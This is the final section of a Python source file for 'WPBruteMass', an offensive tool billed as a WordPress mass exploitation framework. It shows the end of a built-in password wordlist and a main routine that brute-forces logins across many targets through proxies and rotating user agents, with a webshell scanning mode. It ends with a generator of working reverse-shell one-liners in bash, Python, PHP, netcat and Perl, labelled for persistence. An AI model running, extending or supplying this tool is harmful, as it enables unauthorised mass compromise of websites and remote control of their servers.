        "000000", "trustno1", "batman", "solo", "whatever", "test123",
        "hunter", "ranger", "buster", "thomas", "tigger", "robert", "access",
        "pass", "1212", "123qwe", "qwerty123456", "1q2w3e4r", "123456a",
        "zaq1xsw2", "12344321", "zxcvbnm", "1qaz2wsx", "987654321",
        "qwertyuiop", "iloveyou!", "password!", "qwerty1", "password12",
        "p@ssword", "Passw0rd", "P@ssw0rd", "PASSWORD", "admin1234",
        "administrator", "root", "toor", "ubnt", "guest", "temp123",
        "default", "changeme", "secret", "pass123", "test", "testing",
        "demo", "backup", "support", "info", "webmaster", "master123",
        "mysql", "postgres", "oracle", "sa123", "sqlserver",
        "wordpress", "wp123", "wpadmin", "blog", "wp",
        "server", "localhost", "domain", "company", "company123",
        "123admin", "admin2019", "admin2020", "admin2021", "admin2022",
        "admin2023", "admin2024", "Admin@123", "admin@123", "Admin123",
        "password2020", "Password1", "Password123", "pass1234",
        "letmein123", "welcome1", "Welcome1", "Welcome123",
        "changethis", "temporary", "temp1234", "default123",
        "system", "manager", "office", "office365", "sharepoint",
        "vpn123", "remote", "citrix", "vmware", "hyperv",
        "cisco123", "router", "switch", "network", "firewall",
        "security", "secure123", "protect", "safepass",
        "jordan", "jennifer", "michelle", "matthew", "andrew",
        "joshua", "christopher", "nicholas", "brandon", "stephen",
        "tiffany", "amanda", "melissa", "samantha", "sarah",
        "steven", "daniel", "kevin", "brian", "jason",
        "jeffrey", "ryan", "jacob", "kyle", "tyler",
        "justin", "aaron", "nathan", "samuel", "billy",
        "johnny", "jackson", "freddy", "wesley", "cody",
        "dakota", "austen", "blake", "connor", "hunter",
        "dylan", "cameron", "logan", "lucas", "zachary",
        "gabriel", "anthony", "alexander", "benjamin", "ethan",
        "owen", "aidan", "wyatt", "luke", "cole",
        "tristan", "evan", "jack", "max", "gavin",
    ]

# ─── Main Entry Point ─────────────────────────────────────────────────────────

def main():
    # Global declarations must come first before any references in this function
    global MAX_THREADS, TIMEOUT, OUTPUT_FILE, SUCCESS_LOG, FOUND_SHELLS_FILE
    global proxies_list, user_agents, shell_dict
    
    parser = argparse.ArgumentParser(
        description="WPBruteMass v2.0 - WordPress Mass Exploitation Framework",
        usage="python3 %(prog)s <targets.txt|URL> [options]"
    )
    parser.add_argument("target", help="Target URL or file containing targets (one per line)")
    parser.add_argument("-w", "--wordlist", default=WORDLIST_FILE, help=f"Password wordlist (default: {WORDLIST_FILE})")
    parser.add_argument("-t", "--threads", type=int, default=MAX_THREADS, help=f"Thread count (default: {MAX_THREADS})")
    parser.add_argument("-p", "--proxy-file", default=PROXY_FILE, help="Proxy list file")
    parser.add_argument("-u", "--user-agent-file", default=USER_AGENT_FILE, help="Custom User-Agent list file")
    parser.add_argument("-s", "--shell-dict", default=SHELL_DICT_FILE, help="Shell dictionary file for scanner")
    parser.add_argument("--scan-only", action="store_true", help="Webshell scanner mode only (skip validation/bruteforce)")
    parser.add_argument("--timeout", type=int, default=TIMEOUT, help=f"Request timeout (default: {TIMEOUT}s)")
    parser.add_argument("-o", "--output", default=OUTPUT_FILE, help=f"Output file (default: {OUTPUT_FILE})")
    
    args = parser.parse_args()
    
    MAX_THREADS = args.threads
    TIMEOUT = args.timeout
    OUTPUT_FILE = args.output
    SUCCESS_LOG = "successful_" + OUTPUT_FILE if OUTPUT_FILE != "wpbrutemass_output.txt" else SUCCESS_LOG
    FOUND_SHELLS_FILE = "found_" + OUTPUT_FILE if OUTPUT_FILE != "wpbrutemass_output.txt" else FOUND_SHELLS_FILE
    
    # Load lists
    proxies_list = load_file_lines(args.proxy_file if os.path.exists(args.proxy_file) else PROXY_FILE)
    user_agents = load_file_lines(args.user_agent_file if os.path.exists(args.user_agent_file) else USER_AGENT_FILE)
    shell_dict = load_file_lines(args.shell_dict if os.path.exists(args.shell_dict) else SHELL_DICT_FILE, DEFAULT_SHELL_NAMES)
    
    # Load wordlist
    wordlist = load_file_lines(args.wordlist if os.path.exists(args.wordlist) else WORDLIST_FILE)
    if not wordlist:
        log("[*] No wordlist found, using built-in 10k common passwords...")
        wordlist = load_builtin_wordlist()
    
    # Load targets
    targets = load_targets(args.target)
    if not targets:
        log("[!] No targets specified.")
        sys.exit(1)
    
    log(f"[*] WPBruteMass v{VERSION} initialized")
    log(f"[*] Target: {args.target}")
    log(f"[*] Wordlist: {len(wordlist)} passwords")
    log(f"[*] Proxies: {len(proxies_list)}")
    log(f"[*] Shell dictionary: {len(shell_dict)} entries")
    
    # Clear output files with UTF-8 encoding
    for f in [OUTPUT_FILE, SUCCESS_LOG, FOUND_SHELLS_FILE]:
        with open(f, "w", encoding="utf-8") as fh:
            fh.write(f"# WPBruteMass v{VERSION} - {time.ctime()}\n")
    
    if args.scan_only:
        # STEP 5 only
        for target in targets:
            scan_webshell(target)
    else:
        pipeline_attack(targets, wordlist)
    
    log("[*] WPBruteMass completed.")

# ─── Reverse Shell Generator (for step 4 persistence) ────────────────────────

def generate_reverse_shell(lhost, lport, shell_type="bash"):
    """Generate reverse shell payload."""
    shells = {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "nc": f"nc -e /bin/sh {lhost} {lport}",
        "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
    }
    return shells.get(shell_type, shells["bash"])

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log("\n[!] Interrupted by user. Exiting.")
        sys.exit(0)
    except Exception as e:
        log(f"[!] Fatal error: {str(e)}")
        sys.exit(1)